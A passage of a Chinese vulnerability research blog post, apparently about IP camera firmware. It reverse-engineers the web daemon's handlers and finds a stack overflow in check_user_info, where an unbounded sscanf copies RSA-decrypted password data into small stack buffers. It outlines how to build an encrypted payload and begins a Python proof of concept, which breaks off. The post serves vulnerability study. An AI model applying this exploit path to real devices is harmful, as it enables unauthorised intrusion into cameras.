class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>访问了 aDsHandleMethod 全局变量，根据不同的 method 调用不同的 handler，利用 IDA 查找可以发现 5 个 handler 函数指针：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.rodata:00029A24 method_get_handler DCD get_handler+1</span><br><span class="line">.rodata:00029A28 method_add_handler DCD three_handler+1</span><br><span class="line">.rodata:00029A2C method_delete_handler DCD three_handler+1</span><br><span class="line">.rodata:00029A30 method_set_handler DCD three_handler+1</span><br><span class="line">.rodata:00029A34 method_do_handler DCD do_handler+1</span><br></pre></td></tr></table></figure></div>

<p>其中第 2 ~ 4 个 handler 共用一个函数。</p>
<p>找到 do_handler，代码如下</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *__fastcall <span class="title function_">do_handler</span><span class="params">(_DWORD *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v1; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> *v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  _DWORD **v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> *result; <span class="comment">// r0</span></span><br><span class="line">  _DWORD *v10; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// r1</span></span><br><span class="line">  <span class="type">int</span> (__fastcall *v13)(_DWORD *, <span class="type">int</span>); <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// r0</span></span><br><span class="line">  _DWORD *v15; <span class="comment">// r0</span></span><br><span class="line">  _DWORD *v16; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v17; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v19; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v20; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v21; <span class="comment">// [sp+0h] [bp-28h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v22; <span class="comment">// [sp+4h] [bp-24h]</span></span><br><span class="line"></span><br><span class="line">  v21 = <span class="number">0</span>;</span><br><span class="line">  v1 = a1;</span><br><span class="line">  v22 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 || *a1 &lt; <span class="number">0</span> || (v2 = a1[<span class="number">6</span>]) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;ds_handle_method_do&quot;</span>, <span class="number">2487</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Invalid params.&quot;</span>);</span><br><span class="line">LABEL_27:</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v3 = jso_next_sub_obj(v2, <span class="number">0</span>, &amp;v21);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = get_module_root_const();</span><br><span class="line">    v6 = v5;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = jso_new_obj(v5);</span><br><span class="line">      v1[<span class="number">7</span>] = v8;</span><br><span class="line">      <span class="keyword">if</span> ( v8 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( jso_is_obj(*v3) != <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">          result = jso_next_sub_obj(v1[<span class="number">6</span>], v3, &amp;v21);</span><br><span class="line">          v3 = result;</span><br><span class="line">          <span class="keyword">if</span> ( !result )</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = get_module_node(v6, v21);</span><br><span class="line">        <span class="keyword">if</span> ( v10 )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = *v3;</span><br><span class="line">          <span class="keyword">for</span> ( i = <span class="number">0</span>; ; i = v16 )</span><br><span class="line">          &#123;</span><br><span class="line">            v15 = jso_next_sub_obj(v11, i, &amp;v22);</span><br><span class="line">            v16 = v15;</span><br><span class="line">            <span class="keyword">if</span> ( !v15 )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">            v17 = v22;</span><br><span class="line">            v18 = *v15;</span><br><span class="line">            <span class="keyword">if</span> ( !v22 )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            v19 = get_ds_node(v10, v22, <span class="number">2u</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !v19 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;do_keyword_action&quot;</span>, <span class="number">2284</span>);</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;Service %s not support.&quot;</span>, v17);</span><br><span class="line">              <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">              v20 = <span class="number">-40106</span>;</span><br><span class="line">              <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">            &#125;</span><br><span class="line">            v13 = *(v19 + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !v13 )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;do_keyword_action&quot;</span>, <span class="number">2297</span>);</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;Function keyword_action is NULL.&quot;</span>);</span><br><span class="line">              <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">              v20 = <span class="number">-40101</span>;</span><br><span class="line">LABEL_31:</span><br><span class="line">              v1[<span class="number">5</span>] = v20;</span><br><span class="line">LABEL_26:</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;ds_handle_method_do&quot;</span>, <span class="number">2536</span>);</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;Run %s service failed&quot;</span>, v22);</span><br><span class="line">              <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">            &#125;</span><br><span class="line">            v14 = v13(v1, v18);                 <span class="comment">// 调用对应的函数</span></span><br><span class="line">            v1[<span class="number">5</span>] = v14;</span><br><span class="line">            <span class="keyword">if</span> ( v14 )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">            v11 = *v3;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;do_keyword_action&quot;</span>, <span class="number">2277</span>);</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Invalid params.&quot;</span>);</span><br><span class="line">          <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">          <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;ds_handle_method_do&quot;</span>, <span class="number">2525</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Module %s not support.&quot;</span>, v21);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        v4 = <span class="number">-40106</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;ds_handle_method_do&quot;</span>, <span class="number">2512</span>);</span><br><span class="line">      v7 = <span class="string">&quot;Create new json object failed.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;ds_handle_method_do&quot;</span>, <span class="number">2503</span>);</span><br><span class="line">      v7 = <span class="string">&quot;Get model root node failed.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(v7);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    v4 = <span class="number">-40101</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;ds_handle_method_do&quot;</span>, <span class="number">2495</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Request signal is illegal.&quot;</span>);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    v4 = <span class="number">-40209</span>;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_17:</span><br><span class="line">  v1[<span class="number">5</span>] = v4;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>第 93 行附近使用了动态的函数指针调用不同函数，静态分析中暂时无法定位具体的函数列表。</p>
<p>由于手中有真实设备，所以可以通过抓包的方式获得一些功能接口，通过字符串搜索发现了疑似的函数参照表：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.data:00045EC0 dword_45EC0     DCD 0                   ; DATA XREF: sub_25F4C↑o</span><br><span class="line">.data:00045EC0                                         ; .text:off_25F54↑o</span><br><span class="line">.data:00045EC4                 DCD 0</span><br><span class="line">.data:00045EC8                 DCD 0x2A62C</span><br><span class="line">.data:00045ECC                 DCD 0x2A62C</span><br><span class="line">.data:00045ED0                 DCD 0x45F44</span><br><span class="line">.data:00045ED4                 DCD 0</span><br><span class="line">.data:00045ED8                 DCD 0x45EDC</span><br><span class="line">.data:00045EDC                 DCD 0x30BD0</span><br><span class="line">.data:00045EE0                 DCD 0x25CAD</span><br><span class="line">.data:00045EE4                 DCD 0x30BE1</span><br><span class="line">.data:00045EE8                 DCD 0x256C1</span><br><span class="line">.data:00045EEC                 DCD 0x30BF2</span><br><span class="line">.data:00045EF0                 DCD 0x2575D</span><br><span class="line">.data:00045EF4                 DCD 0</span><br><span class="line">.data:00045EF8                 DCD 0</span><br><span class="line">.data:00045EFC                 DCD 0x2A65A</span><br><span class="line">.data:00045F00                 DCD 0xA00</span><br><span class="line">.data:00045F04                 DCD 0x45FC4</span><br><span class="line">.data:00045F08                 DCD 0</span><br><span class="line">.data:00045F0C                 DCD 0x25B19</span><br><span class="line">.data:00045F10                 DCD 0x253F9</span><br><span class="line">.data:00045F14                 DCD 0x30B00</span><br><span class="line">.data:00045F18                 DCD 0xA00</span><br><span class="line">.data:00045F1C                 DCD 0x45FC4</span><br><span class="line">.data:00045F20                 DCD 0</span><br><span class="line">.data:00045F24                 DCD 0x25B19</span><br><span class="line">.data:00045F28                 DCD 0x25455</span><br><span class="line">.data:00045F2C                 DCD 0</span><br><span class="line">.data:00045F30                 DCD 0</span><br><span class="line">.data:00045F34                 DCD 0</span><br><span class="line">.data:00045F38                 DCD 0</span><br><span class="line">.data:00045F3C                 DCD 0</span><br><span class="line">.data:00045F40                 DCD 0</span><br></pre></td></tr></table></figure></div>

<p>IDA 默认没有把这里识别成任何的变量，但是从 Ghidra 中寻找这部分数据可以得到以下解析结果：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">                     DAT_00045ec0                                    XREF[2]:     00025f4c (*) , 00025f54 (*)   </span><br><span class="line">00045ec0 00              ??         00h</span><br><span class="line">00045ec1 00              ??         00h</span><br><span class="line">00045ec2 00              ??         00h</span><br><span class="line">00045ec3 00              ??         00h</span><br><span class="line">00045ec4 00              ??         00h</span><br><span class="line">00045ec5 00              ??         00h</span><br><span class="line">00045ec6 00              ??         00h</span><br><span class="line">00045ec7 00              ??         00h</span><br><span class="line">00045ec8 2c  a6  02  00    addr       s_user_management_0002a62c                       = &quot;user_management&quot;</span><br><span class="line">00045ecc 2c  a6  02  00    addr       s_user_management_0002a62c                       = &quot;user_management&quot;</span><br><span class="line">00045ed0 44  5f  04  00    addr       PTR_DAT_00045f44                                 = 0002a63c</span><br><span class="line">00045ed4 00              ??         00h</span><br><span class="line">00045ed5 00              ??         00h</span><br><span class="line">00045ed6 00              ??         00h</span><br><span class="line">00045ed7 00              ??         00h</span><br><span class="line">00045ed8 dc  5e  04  00    addr       PTR_s_change_user_info_00045edc                  = 00030bd0</span><br><span class="line">                     PTR_s_change_user_info_00045edc                 XREF[1]:     00045ed8 (*)   </span><br><span class="line">00045edc d0  0b  03  00    addr       s_change_user_info_00030bd0                      = &quot;change_user_info&quot;</span><br><span class="line">00045ee0 ad  5c  02  00    addr       FUN_00025cac+1</span><br><span class="line">00045ee4 e1  0b  03  00    addr       s_get_encrypt_info_00030be1                      = &quot;get_encrypt_info&quot;</span><br><span class="line">00045ee8 c1  56  02  00    addr       FUN_000256c0+1</span><br><span class="line">00045eec f2  0b  03  00    addr       s_check_user_info_00030bf2                       = &quot;check_user_info&quot;</span><br><span class="line">00045ef0 5d  57  02  00    addr       FUN_0002575c+1</span><br><span class="line">00045ef4 00              ??         00h</span><br><span class="line">00045ef5 00              ??         00h</span><br><span class="line">00045ef6 00              ??         00h</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这段数据是 字符串、函数指针、字符串、函数指针 这种形式排列的，大概分析以下可以发现每个字符串下方的函数就是这个字符串对应的 handler，例如 0x45EDC  位置的字符串是 change_user_info，而 0x45EE0 位置的函数指针正是 change_user_info 接口的 handler。</p>
<p>由此我们找到了一个相对比较完整的设备接口 handler 列表，接下来的操作可以是提取接口然后依次分析。</p>
<p>在 0x45EEC 位置的字符串是 check_user_info，对应的 handler 代码如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> <span class="type">int</span> __fastcall <span class="title function_">do_login</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v6; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v7; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v9; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">size_t</span> v10; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">size_t</span> v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v12; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// [sp+0h] [bp-10h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [sp+10h] [bp+0h]</span></span><br><span class="line"></span><br><span class="line">  v2 = a1;</span><br><span class="line">  v3 = a2;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v16, <span class="number">0</span>, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v15, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-60305</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-60305</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !jso_is_obj(v3) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-60305</span>;</span><br><span class="line">  v5 = jso_obj_get_string_origin(v3, <span class="string">&quot;username&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v5 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-60305</span>;</span><br><span class="line">  v6 = jso_obj_get_string_origin(v3, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-60305</span>;</span><br><span class="line">  v7 = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">  v8 = jso_obj_get_string_origin(v3, <span class="string">&quot;encrypt_type&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">    v7 = v8;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;check_user_info&quot;</span>, <span class="number">1016</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;encrypt_type:%s.&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v7, <span class="string">&quot;2&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = get_private_key();</span><br><span class="line">    v10 = <span class="built_in">strlen</span>(v6);</span><br><span class="line">    v11 = <span class="built_in">strlen</span>(v9);</span><br><span class="line">    v12 = private_decrypt(v6, v10, v9, v11);    <span class="comment">// 解密用户输入的密码</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;check_user_info&quot;</span>, <span class="number">1022</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;plaintext:%s.&quot;</span>, v12);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = <span class="built_in">sscanf</span>(v12, <span class="string">&quot;%[^:]:%[^:]&quot;</span>, &amp;v16, &amp;v15);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\t [dsd] %s(%d): &quot;</span>, <span class="string">&quot;check_user_info&quot;</span>, <span class="number">1026</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v13 == <span class="number">2</span> )</span><br><span class="line">        v6 = &amp;v16;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;hashPswd(%s)  rsa_nonce(%s).&quot;</span>, &amp;v16, &amp;v15);</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">      <span class="built_in">free</span>(v12);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = sub_17406(v2);</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-40407</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !sub_175B0(v2, v5, v6) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-40401</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v7, <span class="string">&quot;2&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">-40409</span>;</span><br><span class="line">    <span class="keyword">if</span> ( sub_17B8C(&amp;v15) &gt;= <span class="number">0</span> )</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从逻辑上来看，此函数是用于检查账户信息的，用户可以传入 username 以及 password，其中 password 是经过加密的。</p>
<p>函数接受到 password 之后会调用 private_decrypt 对 password 解密，从解密函数名上来看 password 很可能是经过公钥密码加密，例如 RSA。经过解密的字符串会被带入 sscanf 函数拷贝到 stack 某个变量中。</p>
<p>注意这里的 sscanf 格式化字符串并没有限制拷贝字节的数量，考虑到 RSA 最大的明文可以是 128 字节，但是 sscanf 的目标 buffer (大小可在开头的 memset 看到) 加起来只有 80 字节，而且查看 IDA 的变量定义发现两个 buffer 都靠近栈底。所以很可能会导致溢出。</p>
<p>至于能否产生溢出，还要看 private_decrypt  函数的具体实现逻辑，经过搜索发现此函数是 &#x2F;usr&#x2F;lib&#x2F;libdecrypter.so 库导出的，代码如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">private_decrypt</span><span class="params">(<span class="type">int</span> a1, <span class="type">signed</span> <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v6; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v7; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v10; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v11; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">void</span> *v12; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [sp+8h] [bp-4h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [sp+Ch] [bp+0h]</span></span><br><span class="line">  <span class="type">char</span> v15; <span class="comment">// [sp+10h] [bp+4h]</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// [sp+88h] [bp+7Ch]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [sp+108h] [bp+FCh]</span></span><br><span class="line">  <span class="type">char</span> v18; <span class="comment">// [sp+190h] [bp+184h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v5 = a1;</span><br><span class="line">  v6 = a2;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 != <span class="number">172</span> || !a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = a2;</span><br><span class="line">    v8 = <span class="string">&quot;wrong input. ciphertext_len %d.\n&quot;</span>;</span><br><span class="line">LABEL_4:</span><br><span class="line">    msglog(<span class="number">5</span>, <span class="string">&quot;DECRYPTER&quot;</span>, v8, v7);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = <span class="number">1024</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !j_rsa_base64_decode(a3, a4, &amp;v18, &amp;v13) )</span><br><span class="line">  &#123;</span><br><span class="line">    msglog(<span class="number">5</span>, <span class="string">&quot;DECRYPTER&quot;</span>, <span class="string">&quot;Base64 decode private key error.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  InitRsaKey(&amp;v17, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( RsaPrivateKeyDecode(&amp;v18, &amp;v14, &amp;v17, v13) )</span><br><span class="line">  &#123;</span><br><span class="line">    msglog(<span class="number">5</span>, <span class="string">&quot;DECRYPTER&quot;</span>, <span class="string">&quot;Private key decode error: %d \n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v13 = <span class="number">128</span>;</span><br><span class="line">    v4 = j_rsa_base64_decode(v5, v6, &amp;v16, &amp;v13);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v11 = RsaPrivateDecrypt(&amp;v16, v13, &amp;v15, <span class="number">117</span>, &amp;v17);</span><br><span class="line">      <span class="keyword">if</span> ( v11 &lt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = v11;</span><br><span class="line">        v8 = <span class="string">&quot;Decrypt ciphtertext error. ret %d\n&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">      &#125;</span><br><span class="line">      v12 = <span class="built_in">calloc</span>(<span class="number">0x75</span>u, <span class="number">1u</span>);</span><br><span class="line">      v4 = (<span class="type">int</span>)v12;</span><br><span class="line">      <span class="keyword">if</span> ( v12 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(v12, &amp;v15, v11);</span><br><span class="line">        *(_BYTE *)(v4 + v11) = <span class="number">0</span>;</span><br><span class="line">        FreeRsaKey(&amp;v17);</span><br><span class="line">        <span class="keyword">return</span> v4;</span><br><span class="line">      &#125;</span><br><span class="line">      v10 = <span class="string">&quot;Calloc mem error.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v10 = <span class="string">&quot;Base64 decode ciphtertext error.\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(<span class="type">signed</span> <span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *))msglog)(<span class="number">5</span>, <span class="string">&quot;DECRYPTER&quot;</span>, v10);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>简单分析发现此函数确实是 RSA 算法的解密函数，并且内部限制了明文的长度为 128 字节。</p>
<p>传入的密文应该是 BASE64 编码的，根据 sscanf 参数判断明文中应该以冒号作为分隔符，前半部分是 password，后半部分是 nonce 值。</p>
<p>弄清楚数据的基本格式之后，可以尝试构造 payload，不过首先要解决一个问题，那就是 RSA 的公钥从哪里获取。</p>
<p>由于我们分析的都是 web 端接口，首先考虑的就是数据是否由前端加密，或者在正式发送此请求之前，会发送其他请求获取 RSA 公钥。</p>
<p>抓包分析之后发现使用的是第二种方法，在发送正式请求之前，会首先发送请求获取 RSA 公钥，使用的接口是 user_management，参数为 get_encrypt_info。</p>
<p>所以到这里我们的思路就是首先请求服务器获取一个 RSA 公钥，然后对构造的 payload 进行加密操作，之后发送请求，验证是否能够触发漏洞。</p>
<p>设备的 web 管理界面存在日志窗口：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/IPC43AN-4.png"
                     
                ></p>
<p>是否触发了漏洞可以通过此窗口查看。</p>
<p>下面是我编写的一个简单的 poc：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5 <span class="keyword">as</span> Cipher_pkcs1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> PKCS1_v1_5 <span class="keyword">as</span> Signature_pkcs1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;*&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">stok = <span class="string">&quot;*&quot;</span>   <span class="comment"># set a valid stok value here!</span></span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;application/json, text/javascript, */*; q=0.01&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;X-Requested-With&quot;</span>:<span class="string">&quot;XMLHttpRequest&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json; charset=UTF-8&quot;</span>,\</span><br><span class="line">               <span class="string">&quot;Accept-Encoding&quot;</span>:<span 